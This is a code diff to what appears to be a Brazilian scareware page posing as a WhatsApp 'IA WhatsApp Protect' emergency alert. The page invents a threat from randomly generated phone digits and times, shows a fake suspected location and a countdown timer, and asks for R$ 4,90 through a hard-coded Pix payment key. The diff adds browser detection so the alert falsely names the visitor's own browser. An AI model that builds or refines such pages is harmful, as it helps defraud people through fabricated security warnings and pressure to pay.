@@ -45,7 +45,7 @@
       Número: <b id="numero"></b><br>
       Localização suspeita: <b>São Paulo – <span id="hora"></span></b><br><br>
 
-      O sistema ativou automaticamente o protocolo de emergência <b>IA WhatsApp Protect</b>,<br>
+      <b id="navegador"></b> ativou automaticamente o protocolo de emergência IA WhatsApp Protect,<br>
       com escaneamento de ameaças em tempo real utilizando <b>tecnologia de Inteligência Artificial</b>.<br><br>
 
       🔐 <b>Proteção instantânea por apenas R$ 4,90</b><br>
@@ -62,7 +62,7 @@
   </div>
 
   <script>
-    // Número aleatório e mascarado
+    // Número aleatório
     function gerarNumero() {
       const final1 = Math.floor(Math.random() * 90 + 10);
       const final2 = Math.floor(Math.random() * 90 + 10);
@@ -70,7 +70,7 @@
     }
     document.getElementById("numero").innerText = gerarNumero();
 
-    // Horário aleatório
+    // Hora aleatória
     function gerarHora() {
       const h = String(Math.floor(Math.random() * 5) + 1).padStart(2, '0');
       const m = String(Math.floor(Math.random() * 60)).padStart(2, '0');
@@ -78,7 +78,20 @@
     }
     document.getElementById("hora").innerText = gerarHora();
 
-    // Timer regressivo
+    // Navegador detectado ou fallback
+    function detectarNavegador() {
+      const ua = navigator.userAgent.toLowerCase();
+      if (ua.includes("edg")) return "O Microsoft Edge";
+      if (ua.includes("opr") || ua.includes("opera")) return "O Opera";
+      if (ua.includes("brave")) return "O Brave";
+      if (ua.includes("chrome")) return "O Google Chrome";
+      if (ua.includes("safari")) return "O Safari";
+      if (ua.includes("firefox")) return "O Mozilla Firefox";
+      return "O sistema";
+    }
+    document.getElementById("navegador").innerText = detectarNavegador();
+
+    // Timer
     let segundos = 90;
     const timer = document.getElementById("timer");
     const intervalo = setInterval(() => {
@@ -91,7 +104,7 @@
       }
     }, 1000);
 
-    // Copiar chave Pix
+    // Copiar Pix
     function copiarPix() {
       const chave = `00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/14e57911-d312-47bd-ac6d-0ae819a3772c52040000530398654044.905802BR5923SUL INTERMEDIACOES LTDA6009SAO PAULO62070503***6304BAAB`;
       navigator.clipboard.writeText(chave).then(() => {
